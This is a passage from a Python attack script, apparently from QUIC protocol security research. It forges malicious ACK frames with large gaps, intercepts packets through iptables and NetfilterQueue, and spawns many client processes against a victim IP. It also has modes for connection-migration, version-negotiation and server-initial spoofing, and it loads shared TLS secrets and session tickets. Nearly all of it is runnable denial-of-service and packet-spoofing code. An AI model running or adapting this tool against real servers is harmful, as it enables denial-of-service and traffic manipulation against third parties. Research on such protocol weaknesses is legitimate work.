                available_space = original_frame_size - fixed_fields - ecn_size - frame_type_size
                
                # Create malicious ranges with large gaps
                range_data_array = bytearray()
                range_count = 0
                
                # Create very large gaps in the ACK ranges
                # Start with more moderate gaps to ensure packets are accepted
                start_gap = 500  # More moderate starting gap
                
                for i in range(3):  # Attempt to add at least 3 ranges with massive gaps
                    gap = start_gap + (i * 1000)  # More moderate gap progression
                    range_length = 0  # Only acknowledge a single packet
                    
                    gap_encoded = _encode_uint_var(gap)
                    length_encoded = _encode_uint_var(range_length)
                    
                    if len(gap_encoded) + len(length_encoded) <= available_space:
                        range_data_array.extend(gap_encoded)
                        range_data_array.extend(length_encoded)
                        available_space -= len(gap_encoded) + len(length_encoded)
                        range_count += 1
                        print(f"[*] Added ACK range {range_count}: gap={gap} (hole of {gap+1} packets), length={range_length}")
                    else:
                        break
                
                # Convert to bytes for push_bytes
                range_data = bytes(range_data_array)
                
                # Write modified range count
                temp_buf.push_uint_var(range_count)
                
                # Write modified first ACK range
                temp_buf.push_uint_var(modified_first_ack_range)
                
                # Write range data
                temp_buf.push_bytes(range_data)
                
                # Add padding if needed (use PADDING frame type 0x00)
                padding_needed = original_frame_size - temp_buf.tell() - ecn_size
                if padding_needed > 0:
                    print(f"[*] Adding {padding_needed} bytes of padding")
                    temp_buf.push_bytes(b'\x00' * padding_needed)
                
                # Write ECN counts if present
                if frame_type == QuicFrameType.ACK_ECN:
                    for count in ecn_counts:
                        temp_buf.push_uint_var(count)
                
                # Verify exact size match
                if temp_buf.tell() != original_frame_size:
                    print(f"[!] Frame size mismatch: got {temp_buf.tell()}, expected {original_frame_size}")
                    
                    # Ensure exact size by adding padding or truncating
                    if temp_buf.tell() < original_frame_size:
                        temp_buf.push_bytes(b'\x00' * (original_frame_size - temp_buf.tell()))
                    else:
                        temp_buf.seek(original_frame_size)
                
                # Add the frame to our modified frames
                modified_frames.extend(temp_buf.data[:original_frame_size])
                
                print(f"[+] Successfully forged malicious ACK frame (exact size: {original_frame_size} bytes)")
                
            else:
                # Handle other frame types - copy them exactly
                modified_frames.extend(_encode_uint_var(frame_type))
                
                # Check for specific frame types by value instead of enum attributes
                if frame_type == 0x00:  # PADDING
                    # PADDING (0x00) - No additional data
                    pass
                elif frame_type == 0x01:  # PING
                    # PING (0x01) - No additional data
                    pass
                elif frame_type == 0x06:  # CRYPTO
                    # CRYPTO (0x06) - Handle CRYPTO frames
                    offset = buf.pull_uint_var()
                    length = buf.pull_uint_var()
                    data = buf.pull_bytes(length)
                    modified_frames.extend(_encode_uint_var(offset))
                    modified_frames.extend(_encode_uint_var(length))
                    modified_frames.extend(data)
                # CONNECTION_CLOSE frame type can be 0x1c or 0x1d in different QUIC versions
                elif frame_type in (0x1c, 0x1d):  # Check for both transport and application close
                    print(f"[*] Found CONNECTION_CLOSE frame type: {hex(frame_type)}")
                    # Copy connection close frames exactly
                    error_code = buf.pull_uint_var()
                    frame_type_field = buf.pull_uint_var() if frame_type == 0x1c else 0  # Only transport close has frame_type
                    reason_phrase_length = buf.pull_uint_var()
                    reason_phrase = buf.pull_bytes(reason_phrase_length)
                    
                    # Write back all fields
                    modified_frames.extend(_encode_uint_var(error_code))
                    if frame_type == 0x1c:  # Only for transport close
                        modified_frames.extend(_encode_uint_var(frame_type_field))
                    modified_frames.extend(_encode_uint_var(reason_phrase_length))
                    modified_frames.extend(reason_phrase)
                else:
                    # For any other frame type, just copy remaining data
                    try:
                        print(f"[*] Unknown frame type: {hex(frame_type)}, copying as is")
                        remaining = buf.pull_bytes(len(decrypted_payload) - buf.tell())
                        modified_frames.extend(remaining)
                        break  # Exit the loop after copying the rest
                    except BufferReadError:
                        # Reached end of buffer
                        pass
                    break
        
        # Ensure the final payload is exactly the same size as original
        final_size = len(modified_frames)
        
        if final_size != original_payload_size:
            size_diff = original_payload_size - final_size
            if size_diff > 0:
                # Add PADDING frames to reach exact size
                print(f"[*] Adding {size_diff} bytes of padding to maintain size")
                modified_frames.extend(b'\x00' * size_diff)  # Simple padding bytes
            else:
                # Truncate if too large
                print(f"[*] Truncating {abs(size_diff)} bytes to maintain exact size")
                modified_frames = modified_frames[:original_payload_size]
        
        print(f"[*] Final payload size: {len(modified_frames)} bytes (original: {original_payload_size} bytes)")
        
        if found_ack:
            print("[+] Successfully modified ACK frames with gaps")
        else:
            print("[*] No ACK frames found to modify in this packet")
            
        return bytes(modified_frames)  # Convert to bytes before returning
    
    except BufferReadError as e:
        print(f"[!] Buffer read error: {e}")
        return decrypted_payload
    except Exception as e:
        print(f"[!] Error modifying frames: {e}")
        traceback.print_exc()
        return decrypted_payload

# QUIC variable-length integer encoding helper function
def _encode_uint_var(value):
    """Encode a variable-length unsigned integer."""
    if value <= 63:
        return bytes([value])
    elif value <= 16383:
        return bytes([(value >> 8) | 0x40, value & 0xff])
    elif value <= 1073741823:
        return bytes([
            (value >> 24) | 0x80,
            (value >> 16) & 0xff,
            (value >> 8) & 0xff,
            value & 0xff,
        ])
    else:
        return bytes([
            (value >> 56) | 0xc0,
            (value >> 48) & 0xff,
            (value >> 40) & 0xff,
            (value >> 32) & 0xff,
            (value >> 24) & 0xff,
            (value >> 16) & 0xff,
            (value >> 8) & 0xff,
            value & 0xff,
        ])



def ack_callback(packet, args=None):
    """
    Process QUIC packets for the ACK spoofing attack.
    
    Args:
        packet: NetfilterQueue packet
        args: Command line arguments
    """
    global PACKET_COUNT
    PACKET_COUNT += 1
    
    try:
        from aioquic.buffer import Buffer
        from aioquic.quic.packet import pull_quic_header, QuicPacketType
            
        # Try to identify QUIC packets that might contain ACK frames
        try:
            payload = IP(packet.get_payload())
            if UDP not in payload:
                print("[!] Not a UDP packet")
                packet.accept()
                return
                
            udp_payload = bytes(payload[UDP].payload)
            if not udp_payload or len(udp_payload) < 4:
                print("[!] Empty UDP payload")
                packet.accept()
                return
                
            modified_packet = spoof_ack_packet(packet, args, modify_ack_frames)
            modified_packet.accept()
            print(f"[+] Modified and accepted packet {PACKET_COUNT} with ACK spoofing")
            return
        except Exception as e:
            print(f"[!] Error parsing packet: {e}")
        
        # Default: accept all other packets
        packet.accept()
        
    except Exception as e:
        print(f"[!] Error in ack_callback: {e}")
        traceback.print_exc()
        packet.accept()

def configure_client(args):
    if args.path[0] != "/":
        args.path = "/" + args.path
    url = "https://{victim_ip}:{victim_port}{path}".format(victim_ip=args.victim_ip, victim_port=args.victim_port, path=args.path)
    version = 'VNRF' if args.mode == "vn" else "VERSION_2"
    cid_len = args.cid_len if "cid_len" in args else 20

    #init_dcid = b"A" * cid_len
    #init_scid = b"B" * cid_len
    init_dcid = os.urandom(cid_len)
    init_scid = os.urandom(cid_len)
    if args.mode == 'vn' and args.payload_mode != None:
        if args.payload_mode == "dns":
            init_dcid,init_scid = vp_dns.create_payload(args.payload)
    configuration = QuicConfiguration(
        is_client=True, 
        supported_versions =  [QuicProtocolVersion[version].value],
        alpn_protocols=[args.alpn],
        verify_mode = ssl.CERT_NONE,
        secrets_log_file = open("secrets/secrets.log","w"),
        connection_id_length = cid_len,
        init_dcid = init_dcid,
        init_scid = init_scid,
    )
    # # Ensure qlog directory exists
    # os.makedirs("../../app/shared/qlog/rf", exist_ok=True)
    # # Set up qlog configuration
    # configuration.quic_logger = QuicFileLogger('../../app/shared/qlog/rf')
    return url, configuration

def configure_ack_client(args):
    if args.path[0] != "/":
        args.path = "/" + args.path
    url = "https://{victim_ip}:{victim_port}{path}".format(victim_ip=args.victim_ip, victim_port=args.victim_port, path=args.path)
    version = 'VERSION_1' if args.version == '1' else 'VERSION_2'
    cid_len = args.cid_len if "cid_len" in args else 20
    # Create a copy of the secrets log file for the attacker
    shutil.copy2("../../app/shared/shared_secrets.log", "./client_secrets.log")
    init_dcid = os.urandom(cid_len)
    init_scid = os.urandom(cid_len)
    ticket_path = "../../app/shared/session_ticket.pickle"
    ticket = None
    if os.path.exists(ticket_path):
        with open(ticket_path, "rb") as f:
            ticket = pickle.load(f) 
    configuration = QuicConfiguration(
        is_client=True, 
        supported_versions =  [QuicProtocolVersion[version].value],
        alpn_protocols=[args.alpn],
        verify_mode = ssl.CERT_NONE,
        secrets_log_file = open("./client_secrets.log", "w"),
        connection_id_length = cid_len,
        init_dcid = init_dcid,
        init_scid = init_scid,
        session_ticket = ticket,
    )
    # Ensure qlog directory exists
    os.makedirs("../../app/shared/qlog/attacker", exist_ok=True)
    # Set up qlog configuration
    configuration.quic_logger = QuicFileLogger('../../app/shared/qlog/attacker')

    return url, configuration

def configure_legacy_client(args):
    
    cmd = ""
    if args.legacy == 'lsquic':
        cmd = lsquic_client_tmpl.format(victim_ip=args.victim_ip, victim_port=args.victim_port, host=args.host, path=args.path)
        if args.version and args.version != '1':
            cmd += lsquic_client_flag_version.format(version=args.version)     
        if args.alpn and args.alpn != 'h3':
            cmd += lsquic_client_flag_alpn.format(alpn=args.alpn)
    
    if args.legacy == 'quicly':
        cmd = quicly_client_tmpl.format(victim_ip=args.victim_ip, victim_port=args.victim_port, path=args.path, alpn=args.alpn)
    
    print(cmd)
    return cmd


def main():

    if os.geteuid() != 0:
        exit("[!] Please run this script as root")

    args = parse_arguments()
    print(banner)

    starttime = time.time()
    iptables_insert = iptables_tmpl.format(action="-I", victim_ip=args.victim_ip, victim_port=args.victim_port)
    print("[+] Inserting iptables rules.")
    print(iptables_insert)
    subprocess.run(iptables_insert.split())
    
    try:
        #Initializing netfilter queue
        q = NetfilterQueue()
        if args.mode == 'cm':
            args.limit = args.limit * args.dos
            q.bind(1, lambda packet, starttime=starttime, args=args : connection_migration_callback(packet, starttime, args))
            print("[+] Binding connection migration callback")
        elif args.mode == 'vn':
            args.limit = args.dos
            q.bind(1, lambda packet, args=args : version_negotiation_callback(packet, args))
            print("[+] Binding version negotiation callback")
        elif args.mode == 'si':
            args.limit = args.dos
            q.bind(1, lambda packet,args=args : server_initial_callback(packet, args))
            print("[+] Binding server initial callback")
        elif args.mode == 'ack':
            print("[!] ACK mode not implemented yet, test mode only")
            q.bind(1, lambda packet,args=args : ack_callback(packet, args))
            print("[+] Binding ACK callback")
        else:
            raise NotImplementedError("Mode not implemented")

        print("[+] Starting client")
        processes = []
        if args.mode in ('cm','si') and args.legacy:
            print("[!] Legacy Mode")
            cmd = configure_legacy_client(args)
            for i in range(1,args.dos+1):
                p = subprocess.Popen(cmd.split(), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                processes.append(p)
        elif args.mode == 'ack':
            url, configuration = configure_ack_client(args)
            for i in range(1,args.dos+1):
                p = Process(target=cl.start_client, args=(url, configuration, False, True,))
                processes.append(p)
                p.start()
        else:
            url, configuration = configure_client(args)
            for i in range(1,args.dos+1):
                p = Process(target=cl.start_client, args=(url, configuration,))
                processes.append(p)
                p.start()
        
        print("[+] Hooking into nfqueue")
        q.run()
        print("[+] Running nfqueue, waiting for packets")

    except KeyboardInterrupt:
        print("[-] Keyboard interrupt received. Terminating attack script.")
    except Exception as e:
        print("[!] Something went wrong!")
        print(e)
        print(traceback.format_exc())
    
    print("\n[+] Cleaning up")     
    print("[-] Terminating Client(s)")
    
    for p in processes:
        try:
            p.terminate()
        except:
            pass   
    print("[-] Unbinding netfilter queue.")
    q.unbind() 
    
    print("[-] Deleting iptables rule(s).")
    iptables_delete = iptables_tmpl.format(action="-D", victim_ip=args.victim_ip, victim_port=args.victim_port)
    print(iptables_delete)
    subprocess.run(iptables_delete.split())
    print("[+] Done")

    
if __name__ == "__main__":
    main()
